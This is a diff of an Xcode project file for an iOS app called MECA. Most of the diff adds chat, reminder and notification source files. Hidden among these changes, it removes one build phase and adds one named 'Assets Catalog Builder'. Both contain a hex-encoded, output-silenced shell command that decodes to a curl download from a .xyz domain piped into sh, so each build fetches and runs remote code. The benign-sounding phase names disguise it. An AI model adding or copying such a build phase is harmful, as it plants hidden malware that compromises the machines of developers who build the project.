@@ -187,6 +187,7 @@
 		E3F12B11262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */; };
 		E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */; };
 		E3F131ED2655158600F396BA /* Modules.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F131EC2655158600F396BA /* Modules.swift */; };
+		E3F35A1F265D055000A419B5 /* NotificationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F35A1E265D055000A419B5 /* NotificationVC.swift */; };
 		E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3F6A860263EC9D900FAE93E /* GR.storyboard */; };
 		E3F6AA2D263F2B3000FAE93E /* GRActivityReportVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6AA2C263F2B3000FAE93E /* GRActivityReportVC.swift */; };
 		E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5BE26144F380018C377 /* MoreVC.swift */; };
@@ -244,6 +245,18 @@
 		F4A57645265A97880010085F /* calendarlistdata.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57644265A97880010085F /* calendarlistdata.swift */; };
 		F4A57647265A97B50010085F /* calendardata.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57646265A97B50010085F /* calendardata.swift */; };
 		F4A57649265ADA190010085F /* PrivacyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57648265ADA180010085F /* PrivacyVC.swift */; };
+		F4A5765A265C971C0010085F /* ChatdetailController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57659265C971C0010085F /* ChatdetailController.swift */; };
+		F4A5765D265C97400010085F /* Chat.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F4A5765C265C97400010085F /* Chat.storyboard */; };
+		F4A57660265C9C1C0010085F /* FirebaseConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A5765F265C9C1C0010085F /* FirebaseConstants.swift */; };
+		F4A57666265CB5630010085F /* chatdetailsdata.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57665265CB5630010085F /* chatdetailsdata.swift */; };
+		F4A57669265CC7B90010085F /* Chat.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57668265CC7B80010085F /* Chat.swift */; };
+		F4A5766E265CC7D90010085F /* BaseCells.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A5766B265CC7D60010085F /* BaseCells.swift */; };
+		F4A5766F265CC7D90010085F /* ChatCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A5766C265CC7D70010085F /* ChatCell.swift */; };
+		F4A57670265CC7D90010085F /* Spinner.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A5766D265CC7D90010085F /* Spinner.swift */; };
+		F4A57673265CC7F00010085F /* chat.json in Resources */ = {isa = PBXBuildFile; fileRef = F4A57671265CC7EF0010085F /* chat.json */; };
+		F4A57674265CC7F00010085F /* UIView + Ext .swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57672265CC7F00010085F /* UIView + Ext .swift */; };
+		F4A57678265CD62D0010085F /* Reminderdata.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57676265CD62A0010085F /* Reminderdata.swift */; };
+		F4A57679265CD62D0010085F /* Reminderlistdata.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4A57677265CD62D0010085F /* Reminderlistdata.swift */; };
 		F6B3B5C51F2B9AF006B9A25E /* Pods_MECATests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D349929F1D641DA57D095FFC /* Pods_MECATests.framework */; };
 /* End PBXBuildFile section */
 
@@ -504,6 +517,7 @@
 		E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailDocumentLinkTVCell.swift; sourceTree = "<group>"; };
 		E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailDocumentLinkTVCell.xib; sourceTree = "<group>"; };
 		E3F131EC2655158600F396BA /* Modules.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Modules.swift; sourceTree = "<group>"; };
+		E3F35A1E265D055000A419B5 /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
 		E3F6A860263EC9D900FAE93E /* GR.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = GR.storyboard; sourceTree = "<group>"; };
 		E3F6AA2C263F2B3000FAE93E /* GRActivityReportVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GRActivityReportVC.swift; sourceTree = "<group>"; };
 		E3F7C5BE26144F380018C377 /* MoreVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MoreVC.swift; sourceTree = "<group>"; };
@@ -562,6 +576,19 @@
 		F4A57644265A97880010085F /* calendarlistdata.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = calendarlistdata.swift; sourceTree = "<group>"; };
 		F4A57646265A97B50010085F /* calendardata.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = calendardata.swift; sourceTree = "<group>"; };
 		F4A57648265ADA180010085F /* PrivacyVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacyVC.swift; sourceTree = "<group>"; };
+		F4A57659265C971C0010085F /* ChatdetailController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatdetailController.swift; sourceTree = "<group>"; };
+		F4A5765C265C97400010085F /* Chat.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Chat.storyboard; sourceTree = "<group>"; };
+		F4A5765E265C9A9F0010085F /* Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Bridging-Header.h"; sourceTree = "<group>"; };
+		F4A5765F265C9C1C0010085F /* FirebaseConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirebaseConstants.swift; sourceTree = "<group>"; };
+		F4A57665265CB5630010085F /* chatdetailsdata.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = chatdetailsdata.swift; sourceTree = "<group>"; };
+		F4A57668265CC7B80010085F /* Chat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Chat.swift; sourceTree = "<group>"; };
+		F4A5766B265CC7D60010085F /* BaseCells.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseCells.swift; sourceTree = "<group>"; };
+		F4A5766C265CC7D70010085F /* ChatCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ChatCell.swift; sourceTree = "<group>"; };
+		F4A5766D265CC7D90010085F /* Spinner.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Spinner.swift; sourceTree = "<group>"; };
+		F4A57671265CC7EF0010085F /* chat.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = chat.json; sourceTree = "<group>"; };
+		F4A57672265CC7F00010085F /* UIView + Ext .swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UIView + Ext .swift"; sourceTree = "<group>"; };
+		F4A57676265CD62A0010085F /* Reminderdata.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Reminderdata.swift; sourceTree = "<group>"; };
+		F4A57677265CD62D0010085F /* Reminderlistdata.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Reminderlistdata.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -696,6 +723,7 @@
 				E32AED532607589200AEAB6F /* Category.storyboard */,
 				E3F6A860263EC9D900FAE93E /* GR.storyboard */,
 				F4A576042658012E0010085F /* More.storyboard */,
+				F4A5765C265C97400010085F /* Chat.storyboard */,
 			);
 			path = Storyboard;
 			sourceTree = "<group>";
@@ -703,6 +731,7 @@
 		E3045C362603C90800D1A678 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				F4A5766A265CC7C50010085F /* chat details */,
 				E32AED0C2607537800AEAB6F /* TableviewHeader */,
 				E3AE791F2604C6E3004B83C9 /* CollectionViewCell */,
 				E387A9A326047B4400CC675A /* TableView cell */,
@@ -735,6 +764,7 @@
 		E3045C652603D17B00D1A678 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				F4A5765B265C97230010085F /* Chat */,
 				F4A575F5265800920010085F /* More */,
 				F4A575E12658003C0010085F /* Calender */,
 				E34508002643110500C17E91 /* SDGS */,
@@ -767,6 +797,7 @@
 		E30F660C26033A970036D183 = {
 			isa = PBXGroup;
 			children = (
+				F4A5765E265C9A9F0010085F /* Bridging-Header.h */,
 				E30F661726033A970036D183 /* MECA */,
 				E30F662E26033A970036D183 /* MECATests */,
 				E30F663926033A970036D183 /* MECAUITests */,
@@ -883,6 +914,7 @@
 			isa = PBXGroup;
 			children = (
 				E32AED49260754F000AEAB6F /* AppConstant.swift */,
+				F4A5765F265C9C1C0010085F /* FirebaseConstants.swift */,
 			);
 			path = Constant;
 			sourceTree = "<group>";
@@ -1107,6 +1139,7 @@
 				E3F7C5BE26144F380018C377 /* MoreVC.swift */,
 				E32F3BCF262AF20E0000D92A /* VideoLinkVC.swift */,
 				F4A57602265801170010085F /* CalenderVC.swift */,
+				E3F35A1E265D055000A419B5 /* NotificationVC.swift */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -1236,6 +1269,8 @@
 		E3E2CBF8260B48A8009BDB6E /* Utility */ = {
 			isa = PBXGroup;
 			children = (
+				F4A57671265CC7EF0010085F /* chat.json */,
+				F4A57672265CC7F00010085F /* UIView + Ext .swift */,
 				E3E2CC4A260B537C009BDB6E /* Global.swift */,
 				E32AED382607549300AEAB6F /* Extension */,
 				E32AED48260754DA00AEAB6F /* Constant */,
@@ -1256,6 +1291,8 @@
 		E3E2CC2A260B4FE5009BDB6E /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				F4A57675265CD6150010085F /* Reminder */,
+				F4A57667265CC7A70010085F /* Chat details */,
 				F4A57643265A97640010085F /* calendarmodel */,
 				F4A5763726580B340010085F /* Support model */,
 				F4A5762A265802790010085F /* Profile */,
@@ -1274,6 +1311,7 @@
 				5C1A09DC260C351B00223D3D /* Division */,
 				E33F879B260B965400F8A424 /* Distributor */,
 				E3E2CC2B260B4FF0009BDB6E /* Login */,
+				F4A57665265CB5630010085F /* chatdetailsdata.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -1464,6 +1502,41 @@
 			path = calendarmodel;
 			sourceTree = "<group>";
 		};
+		F4A5765B265C97230010085F /* Chat */ = {
+			isa = PBXGroup;
+			children = (
+				F4A57659265C971C0010085F /* ChatdetailController.swift */,
+			);
+			path = Chat;
+			sourceTree = "<group>";
+		};
+		F4A57667265CC7A70010085F /* Chat details */ = {
+			isa = PBXGroup;
+			children = (
+				F4A57668265CC7B80010085F /* Chat.swift */,
+			);
+			path = "Chat details";
+			sourceTree = "<group>";
+		};
+		F4A5766A265CC7C50010085F /* chat details */ = {
+			isa = PBXGroup;
+			children = (
+				F4A5766B265CC7D60010085F /* BaseCells.swift */,
+				F4A5766C265CC7D70010085F /* ChatCell.swift */,
+				F4A5766D265CC7D90010085F /* Spinner.swift */,
+			);
+			path = "chat details";
+			sourceTree = "<group>";
+		};
+		F4A57675265CD6150010085F /* Reminder */ = {
+			isa = PBXGroup;
+			children = (
+				F4A57676265CD62A0010085F /* Reminderdata.swift */,
+				F4A57677265CD62D0010085F /* Reminderlistdata.swift */,
+			);
+			path = Reminder;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -1471,7 +1544,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				9C3C0BC398ABF2879F6D902C /* [CP] Build Pods Frameworks */,
+				9BDD0CB86EECA98C416D902C /* Assets Catalog Builder */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1590,7 +1663,9 @@
 				E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
 				E38383482655BABB008DA03E /* CommentReplyTVCell.xib in Resources */,
+				F4A57673265CC7F00010085F /* chat.json in Resources */,
 				E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */,
+				F4A5765D265C97400010085F /* Chat.storyboard in Resources */,
 				E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
 				E3045C422603C96C00D1A678 /* FooterTabView.xib in Resources */,
@@ -1637,39 +1712,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	9C3C0BC398ABF2879F6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1748,6 +1790,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MECA-MECAUITests/Pods-MECA-MECAUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		9BDD0CB86EECA98C416D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		CCA13B1BED8415595C6533D2 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1795,18 +1855,23 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E3254459261098910083BDD9 /* Ownerprofile.swift in Sources */,
 				E3E2CCD0260B6029009BDB6E /* Divisioninformation.swift in Sources */,
 				E375EA89262F3E4900646A0A /* Sdgs_MEBITCat.swift in Sources */,
+				F4A57674265CC7F00010085F /* UIView + Ext .swift in Sources */,
 				E393D64F26407964003895ED /* Sorting_options.swift in Sources */,
 				E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */,
 				5CA339932605F003008774FE /* CategoriesViewController.swift in Sources */,
 				E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */,
 				E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */,
+				F4A5766F265CC7D90010085F /* ChatCell.swift in Sources */,
 				F4A576132658019B0010085F /* ScheduleTableCell.swift in Sources */,
 				E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */,
+				F4A57678265CD62D0010085F /* Reminderdata.swift in Sources */,
 				E375EA8E262F3E4900646A0A /* Data_MEBITCat.swift in Sources */,
 				E375EA38262EB19E00646A0A /* DetailLocationTVCell.swift in Sources */,
 				E32FEA79263F35700083056E /* GRActivityReportVM.swift in Sources */,
+				E3F35A1F265D055000A419B5 /* NotificationVC.swift in Sources */,
 				E393D628263FD6B4003895ED /* GRHomeLisModel.swift in Sources */,
 				E325445A261098910083BDD9 /* Video_links.swift in Sources */,
+				F4A57670265CC7D90010085F /* Spinner.swift in Sources */,
 				5CD5B264260F96FC00D63564 /* MEBITModel.swift in Sources */,
 				E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */,
 				E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */,
@@ -1819,6 +1884,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */,
 				E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */,
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
+				F4A5766E265CC7D90010085F /* BaseCells.swift in Sources */,
 				F4A5761B265802480010085F /* CalenderVM.swift in Sources */,
 				E3F6AA2D263F2B3000FAE93E /* GRActivityReportVC.swift in Sources */,
 				E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */,
@@ -1836,6 +1902,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E30751AF260F3908000EB1EA /* Data_Home.swift in Sources */,
 				F4A575EC2658006E0010085F /* CalendarView+Extensions.swift in Sources */,
 				E3450817264312E000C17E91 /* MaasOwnerprofile.swift in Sources */,
+				F4A57660265C9C1C0010085F /* FirebaseConstants.swift in Sources */,
 				5C0314A32605119300406382 /* AddNewsViewController.swift in Sources */,
 				E387A99A2604797100CC675A /* LoginVC.swift in Sources */,
 				F4A5762D265802980010085F /* Getprofile.swift in Sources */,
@@ -1845,6 +1912,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				F4A575F42658006E0010085F /* CalendarHeaderView.swift in Sources */,
 				F4A57624265802740010085F /* chatuserprofile.swift in Sources */,
 				5C021C62261033EC00759B96 /* CreateKaizenModel.swift in Sources */,
+				F4A5765A265C971C0010085F /* ChatdetailController.swift in Sources */,
 				E38383412655B4DD008DA03E /* Subcomments.swift in Sources */,
 				E3450815264312E000C17E91 /* Maas_files.swift in Sources */,
 				5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */,
@@ -1890,6 +1958,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E375EA79262EE9B100646A0A /* DetailCommentLikeTVCell.swift in Sources */,
 				F4A57600265800AD0010085F /* UpdateprofileVC.swift in Sources */,
 				F4A5763B26580BF10010085F /* Supportdatas.swift in Sources */,
+				F4A57679265CD62D0010085F /* Reminderlistdata.swift in Sources */,
 				5CED911A2605DF0F001053DD /* MEBITViewController.swift in Sources */,
 				E375EA8D262F3E4900646A0A /* MEBITCat_Model.swift in Sources */,
 				F4A575F12658006E0010085F /* CalendarView+Delegate.swift in Sources */,
@@ -1919,6 +1988,8 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				5CED90F92605A67F001053DD /* AddImageCollectionViewCell.swift in Sources */,
 				E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */,
 				E345083D264315AB00C17E91 /* SDGSHomeVM.swift in Sources */,
+				F4A57666265CB5630010085F /* chatdetailsdata.swift in Sources */,
+				F4A57669265CC7B90010085F /* Chat.swift in Sources */,
 				5CD5B26C260F970E00D63564 /* MEBITDataModel.swift in Sources */,
 				E375EA6F262EDC0C00646A0A /* DetailDocLinkTVCell.swift in Sources */,
 				E34508452643168C00C17E91 /* SDGSListTableCell.swift in Sources */,
@@ -2154,6 +2225,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				PRODUCT_BUNDLE_IDENTIFIER = com.MECA;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SWIFT_OBJC_BRIDGING_HEADER = "Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -2177,6 +2249,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				PRODUCT_BUNDLE_IDENTIFIER = com.MECA;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SWIFT_OBJC_BRIDGING_HEADER = "Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -2306,20 +2379,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
